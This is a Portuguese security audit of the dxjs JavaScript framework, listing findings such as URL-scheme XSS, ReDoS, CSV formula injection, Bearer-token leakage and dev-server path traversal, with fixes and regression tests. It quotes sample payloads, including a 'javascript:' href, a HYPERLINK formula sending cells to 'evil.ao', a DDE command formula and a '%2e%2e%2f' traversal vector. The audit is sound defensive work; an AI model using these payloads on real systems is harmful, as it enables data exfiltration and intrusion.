# Auditoria de Segurança — dxjs

- **Data:** 2026-11-25
- **Âmbito:** monorepo `dxjs` (23 pacotes, ~10 400 LOC de fonte em `packages/*/src`)
- **Método:** 6 lanes de análise adversarial em paralelo (rendering/XSS, transport/edge,
  SSR, parsing XML/OpenAPI, componentes UI, core+dev) + verificação independente dos 4
  sinks de maior risco (render cliente/SSR, `escape`, dev-server, SOAP). Cada achado foi
  reconfirmado por releitura do código; vários provados empiricamente.
- **Objectivos:** OWASP Web + API + LLM, bugs/gaps, performance, resiliência e idempotência.
- **Resultado:** **0 crítico · 5 ALTO · 11 MÉDIO · ~13 BAIXO/INFO.**

---

## 1. Postura geral

O dxjs está **genuinamente bem desenhado em segurança no caminho idiomático**. Confirmado
por leitura directa (não por confiança nos comentários do código):

- O **único** `innerHTML` do monorepo (`packages/dom/src/dom.ts:104`) recebe apenas as
  partes **estáticas** do tagged template (`view.strings`), nunca os valores interpolados
  — a afirmação "never data" é **verdadeira**. Os valores entram por `textContent` /
  `setAttribute` / `addEventListener`.
- **Zero** `eval` / `new Function` / `document.write` / `insertAdjacentHTML` / `.setHTML`
  em todo o código. Injecção parcial de atributo é bloqueada com erro explícito
  (`dom.ts:377`): a interpolação tem de ser o valor completo do atributo.
- **Sem XXE** e **sem billion-laughs**: SOAP/WSDL usam scan por regex, não um parser XML
  (sem `DOMParser`/`DOCTYPE`/`ENTITY`). O leitor de WSDL **não** resolve `import`/`include`
  → sem SSRF por schema externo.
- O SSR **não** serializa estado num `<script>` JSON — re-executa a view no cliente,
  evitando o XSS clássico de hidratação.
- Motor reactivo **glitch-free** (resolve o diamante com uma só reexecução), `dispose()`
  idempotente, teardown bidireccional sem fugas de listeners/efeitos.
- Cliente REST com disciplina de **idempotência exemplar** (POST/PATCH nunca retriados
  sem opt-in explícito ou `Idempotency-Key`).
- **Sem superfície AI/LLM** no código-fonte e **zero dependências de runtime externas**
  além dos pacotes `@dxjs/*` internos → OWASP-LLM essencialmente N/A e superfície de
  supply-chain mínima.

**A fraqueza é sistémica, não pontual.** Os sinks genéricos confiam 100% no que o
programador liga e **não impõem uma rede de segurança por omissão**: esquemas de URL,
atributos `on*`, limites de recurso. A narrativa — "secure by default", "output escaped",
"strict-CSP safe" — é mais absoluta do que o código garante.

> **Nota sobre o gate `no-eval`** (`scripts/no-eval-gate.mjs`): é uma boa defesa, mas
> **puramente sintáctica**. Apanha `innerHTML =` literal e `on*=` escrito no código, mas
> **não** apanha os sinks dinâmicos equivalentes — `setAttribute("onclick", …)` (M1) nem
> `el[prop] = …` com `prop="innerHTML"` (M2). Dá uma garantia mais estreita do que parece.

---

## 2. Tabela de achados (priorizada, deduplicada)

| ID | Sev | OWASP | Achado | Local |
|----|-----|-------|--------|-------|
| **H1** | ALTO* | A03 | Esquema de URL (`javascript:`/`data:`) não validado em `href`/`src`/`action`/… — cliente **e** SSR | `dom.ts:156,220` · `server/render.ts:124`, `server/hydrate.ts:79` |
| **H2** | ALTO | A03/A06 | ReDoS exponencial — `new RegExp(schema.pattern)` de dados aplicado a input sem limite nem timeout | `openapi/schema.ts:64` |
| **H3** | ALTO | A03 | CSV/Formula Injection no export — `= + - @ TAB CR` não neutralizados | `ui/export.ts:23` |
| **H4** | ALTO | API7/API2 | Fuga de `Bearer` para host arbitrário (path absoluto ignora baseUrl + segue redirects) | `transport/rest.ts:70,113`; `transport/adapters.ts:44,146` |
| **H5** | ALTO | fiabilidade | Efeito que lança (sem `onError`) encrava o grafo reactivo **permanentemente** | `core/graph.ts:290` |
| ~~**M1**~~ | ~~MÉDIO~~ **✔ corrigido** | A03 | Atributos `on*` (sem `@`/camelCase) → handler inline; no SSR emitido no HTML | `dom.ts:193`; `server/render.ts:103` |
| ~~**M2**~~ | ~~MÉDIO~~ **✔ corrigido** | A03 | Sink `.prop` escreve `innerHTML`/`outerHTML` com dados + mismatch SSR↔hidratação (só explorável na hidratação — ver §8.1) | `dom.ts:140`; `server/hydrate.ts:65` |
| **M3** | MÉDIO | A01 | Path traversal `/@app/` por `startsWith` + serve dotfiles (`.env`) | `dev/server.ts:228` |
| **M4** | MÉDIO | A05 | DNS rebinding — dev server sem validação de `Host`/`Origin` | `dev/server.ts:290` |
| **M5** | MÉDIO | A03 | XML/SOAP injection via nomes de tag/operação não escapados | `soap/soap.ts:70,82`; `soap/wsdl.ts:46` |
| **M6** | MÉDIO | API4 | `sseAdapter`: reconnect infinito, backoff controlado pelo servidor (`retry:0`→loop) | `transport/adapters.ts:154` |
| **M7** | MÉDIO | API4 | Streams sem limite de recurso (buffer SSE, fila WS, corpo `nodeListener`, acumulação gRPC) | `transport/{adapters,ws}.ts`, `edge/{edge,grpc}.ts` |
| **M8** | MÉDIO | resiliência | `resource()` retry sem gate de idempotência (assimétrico vs `rest.ts`) | `transport/resource.ts:47` |
| **M9** | MÉDIO | API2 | `wsAdapter.auth` aceite mas ignorado → risco CSWSH / stream não autenticada | `transport/ws.ts:24` |
| ~~**M10**~~ | ~~MÉDIO~~ **✔ corrigido** | DoS-cliente | `dataTable` filtra O(n·m) síncrono a cada tecla, sem debounce | `ui/index.ts:217` |
| ~~**M11**~~ | ~~MÉDIO~~ **✔ corrigido** | A04 | SSR streaming: sem timeout/concorrência/cancelamento em Suspense; truncagem em erro | `server/render.ts:236,313` |

*H1 é ALTO em impacto mas **mitigado por CSP `script-src` estrita** (sem `unsafe-inline`),
que o framework não impõe nem verifica.

### BAIXO / INFO (endurecimento — backlog)

| ID | Sev | Achado | Local |
|----|-----|--------|-------|
| ~~L1~~ | BAIXO **✔ corrigido** | `<script>`/`<style>` não são contexto raw-text no scanner → CSS injection em `<style>${data}</style>` | `server/render.ts:21` |
| ~~L2~~ | BAIXO **✔ corrigido** | Sem cabeçalhos de segurança nem `Content-Type`/charset por omissão (CSP/HSTS/nosniff) | `server/*`, `edge/edge.ts:34` |
| ~~L3~~ | BAIXO **✔ corrigido** | `decodeURIComponent` sobre params de rota pode lançar `URIError` e derrubar o router | `component/router.ts:175` |
| ~~L4~~ | BAIXO **✔ corrigido** | `/@fs` não faz `realpath` → symlink no repo escapa à contenção; erro do esbuild ecoa conteúdo | `dev/server.ts:293` |
| ~~L5~~ | BAIXO **✔ corrigido** | HMR long-poll sem limite de waiters/sockets; `since=Number()` aceita `NaN` | `dev/server.ts:270` |
| ~~L6~~ | BAIXO **✔ corrigido** | `onError` tratado trunca as dependências lidas do efeito (pode não auto-recuperar) + filhos órfãos | `core/graph.ts:202` |
| ~~L7~~ | BAIXO **✔ corrigido** | `k8s.apply` confia na forma do evento; evento malformado aborta o lote inteiro | `k8s/index.ts:69` |
| ~~L8~~ | BAIXO **✔ corrigido** | query `keyOf`: chave com `__proto__` colapsa no `JSON.stringify` → colisão de cache | `query/index.ts:69` |
| ~~L9~~ | BAIXO **✔ coberto por H1** | `media`/`avatar` `src`/`poster` sem validação de esquema (delega na CSP) | `ui/media.ts:45,78`; `ui/nav.ts:130` |
| ~~L10~~ | BAIXO **✔ corrigido** | Confiança cega em `Host`/`X-Forwarded-Proto` ao construir o URL do Request | `edge/edge.ts:59` |
| ~~L11~~ | INFO **✔ corrigido** | `createGrpcChannel` abre/fecha sessão HTTP/2 por chamada (sem pooling) | `edge/grpc.ts:92` |
| L12 | INFO **↷ aceite** | Resposta do servidor não validada (OpenAPI valida só o pedido; SOAP devolve `as Res`) | `openapi/openapi.ts:131`; `soap/soap.ts:178` |
| ~~L13~~ | INFO **✔ corrigido** | HMR client confia no `path` do servidor para `import()` dinâmico (mitigado por CSP) | `dev/client.ts:89` |

---

## 3. Achados ALTO em detalhe

### H1 — Esquema de URL não validado (`javascript:`/`data:`) — transversal

**Fluxo.** Valor de dados → `val()` → `String(v)` → `setAttribute(name, …)` (cliente) ou
`href="${escape(v)}"` (SSR). `escape()` (`dom/src/escape.ts`) trata `& < > " '` mas **não**
esquemas de URL. Nenhum ponto valida o esquema quando `name ∈ {href, src, xlink:href,
action, formaction, poster, data}`.

**PoC.** `html\`<a href=${user.site}>abrir</a>\`` com `user.site =
"javascript:fetch('/api/x',{method:'DELETE'})"` → executa ao clicar. `<iframe src=${u}>`
com `data:text/html,...` → executa sem clique.

**Mitigação existente.** CSP `script-src` estrita sem `unsafe-inline` bloqueia a navegação
`javascript:` — mas o framework não a impõe nem a verifica, e a documentação promete
"output escaped" de forma que leva o programador a crer que está protegido. (React bloqueia
`javascript:` em `href` desde a v16.9.)

**Correcção.** Deny-list de esquemas perigosos (`javascript:`/`data:`/`vbscript:`, após
`trim()` e remoção de controlo/zero-width) nos atributos de navegação conhecidos, nos dois
sinks (`dom.ts` cliente, `render.ts`/`hydrate.ts` SSR). Expor um seam `unsafeUrl()` para os
raros casos legítimos de `data:`.

### H2 — ReDoS exponencial no validador OpenAPI

**Fluxo.** `schema.pattern` vem do `openapi.json` (dados) → `new RegExp(schema.pattern)` →
`re.test(value)` sobre input do formulário, sem âncora, sem limite de comprimento, sem
timeout. Recompilado a cada chamada da closure.

**Prova empírica (V8/Node, `pattern="^(a+)+$"`, `value="a"×n+"!"`):** 44 ms @ n=20 ·
1 114 ms @ n=28 · **17 997 ms @ n=32**. Crescimento exponencial → congela a aba.

**Cenário.** O modelo do dxjs lê `openapi.json` em runtime e gera o cliente validado. Um
spec servido por backend comprometido/terceiro com um `pattern` malicioso congela a UI
quando a vítima introduz um valor que não casa (DoS client-side).

**Correcção.** Limitar o comprimento do `value` antes de `re.test`; validar o `pattern`
(`safe-regex`/RE2) ou correr com timeout; compilar o `RegExp` **uma vez** em
`compileValidator` e, se inseguro, ignorá-lo como já se faz com os impossíveis de compilar.

### H3 — CSV / Formula Injection no export

**Fluxo.** `csvField` faz quoting RFC-4180 só quando há `" , \r \n` — mas o quoting **não
protege**: o Excel/Sheets ainda avalia `"=..."`. Nenhuma neutralização de células que
**começam** por `= + - @ TAB(0x09) CR`. Alcançável por `exportTable`/`exportMenu`/
`dataTable({exportable})`/`tableList`.

**Cenário.** Dado de utilizador (nome de empresa, comentário) gravado como
`=HYPERLINK("https://evil.ao/x?d="&A1&A2,"...")` ou `=IMPORTXML(...)` (Sheets) ou
`=cmd|'/c calc'!A1` (DDE, Excel legado). O operador exporta a grelha e abre o `.csv` → a
fórmula avalia: exfiltração de células (dados de outros inquilinos na vista) ou execução de
comando. Vector stored → exportado → executa no cliente.

**Contraste.** `.xls`/`.xlsx` **não** são vulneráveis (escrevem `t="inlineStr"`; fórmulas
OOXML exigem `<f>`). A lacuna é exclusiva do CSV.

**Correcção (~3 linhas).** Antes do quoting, prefixar com `'` (ou TAB) as células que
casam `/^[=+\-@\t\r]/`; aplicar ao `c.label` e ao valor da célula. Opcionalmente
`sanitizeFormulas?: boolean` (default `true`).

### H4 — Fuga de credencial `Bearer` para host arbitrário

**Fluxo.** `buildUrl` (`rest.ts:70`) trata qualquer `path` que comece por `http(s)://` como
absoluto, ignorando `baseUrl`. Imediatamente antes, o cliente injecta sempre
`Authorization: Bearer <token>`. Em `restAdapter`, `path` pode ser `(req)=>string`
(`adapters.ts:44`). Nenhum adaptador define `redirect`, pelo que o `fetch` segue redirects.

**Cenário.** Descritor com `path: (req)=>\`/proxy/${req.target}\`` e `req.target`
controlável; um valor `//evil.com/x` ou `https://evil.com` produz URL absoluto → o token do
utilizador autenticado chega a `evil.com`. Mesmo com paths relativos, um 3xx controlado
pelo servidor leva o cliente a um host arbitrário.

**Correcção.** Em `buildUrl`, não aceitar paths absolutos silenciosamente; se permitidos,
validar `new URL(path).origin` contra allow-list derivada de `baseUrl`. Só injectar
`Authorization` quando o destino final pertence à origem de confiança. Usar
`redirect:"manual"` e reavaliar o host a cada salto.

### H5 — Efeito que lança encrava o grafo reactivo permanentemente

**Fluxo.** No `flush` (`graph.ts:290`), cada efeito corre via `updateIfNecessary(node)` sem
`try/catch` individual. Se um efeito lança e não há `onError` ancestral (o caso comum),
`update` faz `throw` (`graph.ts:223`), o efeito nunca chega a `CLEAN`, e o `finally` do
`flush` executa `queue.length = 0` (`graph.ts:302`). Os efeitos a seguir ficam com
`queued=true`/`state=DIRTY`, e as guardas `markStale` (`node.state < state` falso) e
`enqueue` (`!node.queued` falso) tornam-se no-ops → **nunca mais são reagendados**.

**Cenário.** `effectA` (contador na UI) e `effectB` (lê `user().profile.name`) marcados no
mesmo lote. Se `user()` for `null` momentaneamente, `effectB` lança `TypeError`; `effectA`,
enfileirado depois, **deixa de reagir para sempre** — partes não relacionadas da UI
congelam silenciosamente em produção.

**Correcção.** Isolar cada efeito no laço do `flush`: `try/catch` à volta de
`updateIfNecessary`, encaminhar o erro por `runErrorHandlers(node, err)`, guardar o
primeiro erro não-tratado para relançar **depois** de drenar a fila, e continuar o laço;
no `finally`, repor `queued=false` em todos os nós ainda enfileirados (drenar por índice em
vez de truncar). É o padrão de isolamento por-efeito do Solid/reactively.

---

## 4. Resiliência & Idempotência

A área mais madura — e a mais assimétrica.

**Bem feito (confirmado):** gate de idempotência exemplar em `rest.ts` (POST/PATCH só
retriados com opt-in/`Idempotency-Key`; 4xx≠429/408 nunca retriados); cancelamento
consistente com `AbortSignal.any` (`retry.ts`); `createLiveSource` (`sse.ts`) com backoff +
tecto de tentativas + reset no `open` — a **referência correcta**.

**Dívida:**
1. `sseAdapter` (`adapters.ts`) **não herdou** essa política: sem tecto de tentativas, sem
   jitter, e com backoff **controlado pelo servidor** via linha `retry:` (`retry:0`/negativo
   → loop apertado). É a falha de resiliência mais séria (M6).
2. **Sem jitter** em nenhum backoff → thundering herd em reconnect massivo.
3. Idempotência vive **só** no cliente REST; `resource()` (M8) e o polling de `live.ts`
   repetem sem essa consciência.
4. `wsAdapter` **não tem reconnect nenhum** nem resume (M7/M9).
5. Timeouts ausentes por omissão (gRPC só arma deadline se `deadlineMs` for passado;
   `connect.ts` depende do signal do chamador).
6. Sem geração automática de `Idempotency-Key`.

**Recomendação transversal:** extrair a política de reconnect/backoff de `sse.ts` para
`retry.ts` (com jitter e tecto) e fazer `sseAdapter`/`wsAdapter` consumi-la, eliminando a
divergência e o controlo do backoff pelo servidor.

---

## 5. Cobertura OWASP

- **Web Top-10:** A01 (M3) · A03 (H1, H3, M1, M2, M5, L1) · A04/A05 (L2, M11) ·
  A06 (H2) · A08 (L12). A07/A09/A10 pouco aplicáveis (framework, não aplicação completa).
- **API Top-10:** API2 (H4, M9) · API4 (M6, M7) · API7 (H4).
- **LLM Top-10:** **N/A** — sem integração LLM no código-fonte do dxjs.

---

## 6. Afirmações de segurança CONFIRMADAS (resultado positivo)

1. `innerHTML` só sobre literais estáticos, nunca dados (`dom.ts:104`). ✅
2. Sem `eval`/`new Function`/`document.write`/`insertAdjacentHTML` em todo o código. ✅
3. Texto sempre por `textContent`/`createTextNode` (auto-escapado). ✅
4. Injecção parcial de atributo bloqueada com erro (`dom.ts:377`). ✅
5. `escape()` correcto para texto e atributos citados; SSR fecha atributos não-citados
   entre aspas (sem breakout). ✅
6. Sem XXE / billion-laughs / SSRF-por-WSDL-import (regex, não parser XML). ✅
7. SSR não embebe `<script>` de estado JSON (re-executa a view). ✅
8. Grafo glitch-free, `dispose()` idempotente, teardown sem fugas; ciclos limitados por
   `LOOP_LIMIT`. ✅
9. Cliente REST com idempotência correcta (POST não retriado). ✅
10. Router sem open-redirect cross-origin (`pushState` é same-origin). ✅
11. i18n sem compilação de template; forms sem prototype pollution. ✅
12. Sem superfície AI/LLM; zero dependências de runtime externas. ✅

---

## 7. Prioridades de remediação

1. **H5** (grafo encrava) e **H3** (CSV) — baixo custo, alto impacto; quase mecânicos.
2. **H2** (ReDoS) — limitar input + validar/neutralizar padrão.
3. **H1** (URL scheme) — fecha uma classe inteira de XSS por omissão.
4. **H4** (Bearer leak) — validar origem antes de injectar credencial.
5. MÉDIO: unificar guarda de caminhos no dev server (M3), validar `Host` (M4), limites de
   recurso nos streams (M7), política de reconnect partilhada (M6), debounce (M10).
6. Alinhar a **documentação** com o que o código garante (remover o absolutismo de
   "secure by default" onde a defesa depende da CSP do consumidor).

---

## 8. Estado de remediação (2026-11-25)

Os **5 achados ALTO foram corrigidos e verificados** nesta sessão. Cada correcção tem
um PoC executável (`packages/*/test/security-*.audit.test.ts`) que falhava contra o
código anterior e passa agora; `npm run check` fica verde (342 testes, 0 falhas; gates
`no-eval`/`jsx-types`/`size` PASS).

| ID | Correcção | Ficheiros | PoC (regressão) |
|----|-----------|-----------|-----------------|
| H1 | `sanitizeUrl`/`isUrlAttr` bloqueiam `javascript:`/`vbscript:`/`data:text/html` nos atributos de navegação; aplicado nos sinks do cliente, SSR e hidratação (media `data:image/…` continua permitido) | `dom/src/escape.ts`, `dom/src/dom.ts`, `dom/src/index.ts`, `server/src/render.ts`, `server/src/hydrate.ts` | `dom/test/security-h1-url-scheme.audit.test.ts` |
| H2 | Rejeita padrões com nested-quantifier (forma exponencial clássica), cap de input (2048), `RegExp` compilado uma vez e em cache | `openapi/src/schema.ts` | `openapi/test/security-h2-redos.audit.test.ts` |
| H3 | Prefixo `'` em células que começam por `= + - @ TAB CR`, antes do quoting RFC-4180 | `ui/src/export.ts` | `ui/test/security-h3-csv-injection.audit.test.ts` |
| H4 | `Authorization: Bearer` só injectado quando o URL final fica na origem de confiança (`baseUrl`); absoluto cross-origin não leva credencial | `transport/src/rest.ts` | `transport/test/security-h4-bearer-leak.audit.test.ts` |
| H5 | `flush` isola cada efeito em `try/catch`, drena a fila inteira e só depois relança o primeiro erro não-tratado (fim do freeze permanente) | `core/src/graph.ts` | `core/test/security-h5-flush-isolation.audit.test.ts` |

**Medição H2:** validação de um input de 28 chars contra `^(a+)+$` passou de **11 386 ms**
para **1,3 ms**.

### 8.1 M1 e M2 — corrigidos (2ª sessão, 2026-11-25)

Os sinks genéricos de render passaram a ser **seguros por omissão**. `npm run check` verde
(349 testes, 0 falhas; `@dxjs/server` budget 3072→3200 para acomodar ~40 B de guardas).

| ID | Correcção | Ficheiros | PoC |
|----|-----------|-----------|-----|
| M1 | Atributo `on*` sem `@` é **recusado** (nunca inline), nos 3 caminhos: cliente, SSR, hidratação | `dom/src/dom.ts` (bindAttr+bindProp), `server/src/render.ts`, `server/src/hydrate.ts` | `dom/test/security-m1-on-attr.audit.test.ts`, `server/test/security-m1-m2-ssr-hydrate.audit.test.ts` |
| M2 | `.prop` de `innerHTML`/`outerHTML`/`srcdoc` **recusado** (`isUnsafeProp`); SSR dropa o atributo em vez de o emitir (elimina o mismatch) | `dom/src/escape.ts`, `dom/src/dom.ts`, `server/src/hydrate.ts`, `server/src/render.ts` | `dom/test/security-m2-prop-innerhtml.audit.test.ts`, `server/test/…` |

**Refinamento do achado M2 (apurado por PoC):** o `.prop innerHTML` **não** era explorável no
renderizador *live* — o parser HTML faz lowercase do nome do atributo, logo `.innerHTML` vira
`.innerhtml`, um expando inerte (`el["innerhtml"]=…`), não a propriedade `innerHTML`. O vector
real era **só a hidratação**, onde o nome vem de `planParts` (a string do template, case
preservado). A correcção fecha ambos os caminhos por defesa em profundidade. (A severidade
MÉDIO mantém-se pela hidratação.)

### 8.2 M3 e M4 — corrigidos (3ª sessão, 2026-11-25)

O **dev server** (`@dxjs/dev`) deixou de ter o path traversal no serviço estático e
passou a validar o `Host`. `npm run check` verde (355 testes, 0 falhas; gates
`no-eval`/`jsx-types`/`size` PASS). Cada correcção tem PoC red→green.

| ID | Correcção | Ficheiros | PoC (regressão) |
|----|-----------|-----------|-----------------|
| M3 | `serveStatic` troca o prefixo de string `startsWith(root)` por `isWithin(abs, root)` (contenção por caminho, não por prefixo) e **recusa dotfiles/dot-dirs** (`.env`, `.git/…`). O vector autêntico é `/@app/%2e%2e%2f…` — `%2f` (barra codificada) mantém o `../` como um só segmento opaco através da normalização do `new URL()`, e o `decodeURIComponent` do handler restaura-o | `dev/src/server.ts:228` | `dev/test/security-m3-path-traversal.audit.test.ts` |
| M4 | O handler valida o `Host` contra uma allowlist (`localhost`/`127.0.0.1`/`[::1]`/`::1` + host configurado), strip de porta preservando a forma IPv6 `[::1]:p`; `Host` ausente ou fora da lista → **403**, fechando o DNS rebinding | `dev/src/server.ts:290` | `dev/test/security-m4-host-validation.audit.test.ts` |

**Nota sobre o vector M3:** a repro ingénua `/@app/../app-x/secret` (ou `%2e%2e/`) **não**
chega ao `serveStatic` — o WHATWG URL do Node colapsa o `..` e remove o prefixo `/@app/`.
Só a dupla codificação ponto+barra (`%2e%2e%2f`) preserva o prefixo e entrega o `../` ao
`decodeURIComponent`. O PoC usa esse vector.

### 8.3 M5, M6 e M7 — corrigidos (4ª sessão, 2026-11-25)

Fechados os três MÉDIO prioritários (§255). `npm run check` verde (**364 testes**, 0
falhas; gates `no-eval`/`jsx-types`/`size` PASS — `@dxjs/transport` 4354/5120,
`@dxjs/soap` 1516/2048). Cada correcção tem PoC red→green (red confirmado repondo o
código vulnerável).

| ID | Correcção | Ficheiros | PoC (regressão) |
|----|-----------|-----------|-----------------|
| M5 | Nome de elemento é estrutura, não texto, logo não se escapa — valida-se. `isXmlName` (subconjunto conservador da produção XML `Name`) + `assertXmlName` recusam, **no ponto de emissão**, qualquer chave de pedido (`renderParams`) ou nome de operação (`buildEnvelope`) que não seja um XML Name; `wsdlOperations` descarta operações com nome inválido (defesa em profundidade). Valores continuam escapados por `escapeXml` | `soap/src/soap.ts:51,70,82`; `soap/src/wsdl.ts:48` | `soap/test/security-m5-xml-injection.audit.test.ts` |
| M6 | O servidor deixou de controlar o backoff: o `retry:` é honrado mas **clampado** a `[minRetryMs, maxRetryMs]` (default 250ms–30s) e cada espera tem piso + *full jitter*. Um `retry:0` já não produz `sleep(0)` → sem loop apertado. PoC: um servidor `retry:0` que fecha logo a stream dava 127 reconexões/160ms → ≤20 com o fix | `transport/src/adapters.ts:98,135,183,209` | `transport/test/security-m6-sse-reconnect.audit.test.ts` |
| M7 | Limite de recurso no leitor SSE: o buffer de frame não terminado (`\n\n`) é limitado por `maxBufferBytes` (default 1 MiB); um servidor que transmite sem nunca fechar um frame aborta a stream em vez de esgotar a memória do cliente | `transport/src/adapters.ts:105,139,198` | `transport/test/security-m7-sse-buffer.audit.test.ts` |

**M7 — âmbito e diferimento.** Só o **lado cliente** do M7 (buffer SSE) foi fechado
nesta sessão. Os restantes sub-vectores de M7 são **server-side** e ficam para sessão
própria: fila do `wsAdapter` (`transport/ws.ts`), corpo do `nodeListener`
(`edge/edge.ts`) e acumulação por chamada em gRPC (`edge/grpc.ts`). Racional: tocam
caminhos de servidor/edge distintos (limites de corpo, contrapressão, deadlines) com a
sua própria superfície de teste, e misturá-los aqui alargaria o contrato desta sessão.

### 8.4 M8 e M9 — corrigidos (5ª sessão, 2026-11-25)

Fechados os dois MÉDIO seguintes (ramo `fix/security-audit-m8-m9`). `npm run check`
verde (**370 testes**, 0 falhas; gates `no-eval`/`jsx-types`/`size` PASS —
`@dxjs/transport` 4409/5120). Cada correcção com PoC red→green.

| ID | Correcção | Ficheiros | PoC (regressão) |
|----|-----------|-----------|-----------------|
| M8 | `resource()` ganha um **gate de idempotência** simétrico ao cliente REST: `ResilienceOptions.idempotent` (default `true`, pois um resource é read-like) decide se os `retries` se aplicam — `idempotent:false` suprime-os, evitando que um fetcher com efeitos não idempotentes (POST) seja re-executado. O `timeout` por tentativa continua a aplicar-se (só cancela, não re-executa) | `transport/src/retry.ts:14`; `transport/src/resource.ts:29` | `transport/test/security-m8-resource-idempotency.audit.test.ts` |
| M9 | `wsAdapter.auth` deixa de ser aceite-e-ignorado. Como o browser não permite header `Authorization` no handshake WS, a credencial é transmitida como **primeiro frame** `{type:"authorization",authorization:"Bearer <t>"}`, ANTES do frame de request; o servidor autentica esse frame antes de emitir. Credencial vazia/falsy = ausente (sem frame). Fecha a stream não autenticada / falsa sensação de segurança (CSWSH) | `transport/src/ws.ts:24,55` | `transport/test/security-m9-ws-auth.audit.test.ts` |
| M10 | `dataTable` ganha `debounce?` (ms, default 150; `0` desliga). O `@input` da pesquisa deixa de chamar `query.set` por tecla — passa por um `onSearch` que coalesce o burst de teclas numa **única** passagem do filtro O(n·m), tirando o trabalho pesado do caminho da tecla (o `<input>` é não-controlado, logo o texto digitado continua a aparecer de imediato). Fecha o DoS-cliente (jank/bloqueio da main thread ao escrever numa tabela grande) | `ui/src/index.ts:217` (`onSearch`/`debounce`) | `ui/test/security-m10-datatable-debounce.audit.test.ts` (3 testes) |
| M11 | SSR streaming ganha `StreamOptions{ timeout, concurrency, signal }` em todas as entradas (`renderToStringAsync`/`renderToChunks`/`renderToStream`/`…OOO`). Cada `load()` de Suspense corre sob `loadBounded` (timeout — default 30000 ms — + `AbortSignal`, com o timer sempre limpo no settle → um `load()` que nunca resolve não deixa nada vivo no event loop). Uma boundary que **excede o timeout, rejeita ou é abortada** degrada para a sua própria fallback **em vez de pendurar a resposta ou truncar o documento já emitido**; se estiver sob um `errorBoundary`, re-lança para este o tratar (semântica preservada via flag `guarded`). O caminho out-of-order limita as loads simultâneas por `concurrency` (default 8). | `server/src/render.ts:172` (StreamOptions/`loadBounded`/`streamChild`), `:319` (`oooChunks` gate) | `server/test/security-m11-ssr-streaming.audit.test.ts` (5 testes) |

**Contrato do servidor (M9).** O servidor WS DEVE validar o frame de autenticação
inicial e não emitir dados da subscrição até o validar. Esta fatia entrega o lado
**cliente** (transmissão da credencial); a validação no `edge` server é trabalho seu.

### Endurecimento BAIXO/INFO — Slice A (framework-core)

| ID | Correcção | Ficheiros | PoC (regressão) |
|----|-----------|-----------|-----------------|
| L3 | `router` decodifica params via `safeDecode` (try/catch sobre `decodeURIComponent`); um `%`-escape malformado (`/%E0%A4`, `/%`) já não lança `URIError` — o segmento cai para o valor cru em vez de derrubar o router | `component/src/router.ts` (`safeDecode`) | `component/test/security-l3-router-decode.audit.test.ts` (2) |
| L6 | `graph.update`: num throw **tratado**, os nós-filho criados antes do throw são **dispostos** (`disposeNode`) em vez de ficarem vivos/subscritos (órfãos) até um re-run que pode nunca vir. **Aceite + documentado:** a truncagem do conjunto de dependências lidas é inerente a uma leitura parcial — o efeito re-corre quando muda uma fonte que **chegou a ler**; recuperar de um erro que impediu a leitura de uma fonte exige que o erro limpe por um caminho já lido | `core/src/graph.ts:220` | `core/test/security-l6-orphan-children.audit.test.ts` (1) |
| L8 | `query.keyOf` serializa objectos simples como `{ o: pares [chave,valor] ordenados }` em vez de reconstruir o objecto; uma chave `__proto__` (própria) deixa de bater no setter do protótipo e desaparecer (logo chaves que só diferem em `__proto__` dão keys distintas), e o envelope `{o:…}` mantém objectos estruturalmente distintos de arrays (`{a:1}` vs `[["a",1]]` não colidem — colisão apanhada na revisão pós-fix) | `query/src/index.ts:69` | `query/test/security-l8-keyof-proto.audit.test.ts` (3) |

### Endurecimento BAIXO — Slice B (SSR/edge)

| ID | Correcção | Ficheiros | PoC (regressão) |
|----|-----------|-----------|-----------------|
| L1 | `scanContexts` passa a detectar elementos **raw-text** (`<script>`/`<style>`): como aí as entidades HTML não são descodificadas, não há escaping genérico seguro de dados não-fiáveis para CSS/JS — logo uma interpolação dinâmica dentro de `<script>`/`<style>` é **recusada (dropada)** em todos os caminhos SSR (`renderToString`, streaming, OOO; sem marcador em modo hidratável). RCDATA (`<title>`/`<textarea>`) mantém o escaping HTML normal (correcto) | `server/src/render.ts:21` (`scanContexts` + os 3 renderers + `planParts`) | `server/test/security-l1-rawtext.audit.test.ts` (5) |
| L2 | `htmlResponse` emite cabeçalhos de segurança seguros por omissão — `x-content-type-options: nosniff` e `referrer-policy: strict-origin-when-cross-origin` — com has-guard (o valor do chamador ganha). HSTS fica de fora por omissão (quebra http; é decisão de deployment) | `edge/src/edge.ts` (`htmlResponse`) | `edge/test/security-l2-l10-edge-hardening.audit.test.ts` (1) |
| L10 | `originFromHeaders` deixa de confiar cegamente: um `Host` que não seja uma autoridade simples (regex `HOST_RE`; rejeita path/userinfo/CRLF/espaços) **ou com porta > 65535** cai para `127.0.0.1`, e `X-Forwarded-Proto` só é honrado se for exactamente `http`/`https`. Hostnames com `_` (redes de contentores) são aceites. Backstop: `nodeListener` embrulha `toWebRequest` em try/catch → 400 em vez de deixar escapar um throw síncrono de `new Request` (uncaughtException). Fecha o envenenamento do URL do Request | `edge/src/edge.ts:59` (`HOST_RE`/`originFromHeaders`/`nodeListener`) | `edge/test/security-l2-l10-edge-hardening.audit.test.ts` (3) |

### Endurecimento BAIXO/INFO — Slice C (dev server)

| ID | Correcção | Ficheiros | PoC (regressão) |
|----|-----------|-----------|-----------------|
| L4 | `/@fs` passa a validar a contenção pelo caminho **real**: após `isWithin(link)`, faz `realpath` e re-verifica `isWithin(real, REPO_ROOT)` — um symlink no repo que aponte para fora dá 403. E um erro de transform deixa de ecoar a mensagem crua do esbuild (que embebe frames/caminhos de código): o detalhe vai para o terminal (`console.error`), o cliente recebe um 500 genérico | `dev/src/server.ts:315` | `dev/test/security-l4-fs-symlink.audit.test.ts` (2) |
| L5 | `/@dx/hmr` sanitiza o cursor: um `since` não-numérico/negativo (NaN de `Number("abc")`) é tratado como cliente novo → resposta imediata com o epoch actual, em vez de segurar o socket. E o pool de waiters do long-poll é limitado por `MAX_WAITERS` (256); acima do limite responde 204 em vez de segurar | `dev/src/server.ts:277` (`MAX_WAITERS`) | `dev/test/security-l5-hmr-cursor.audit.test.ts` (2) |
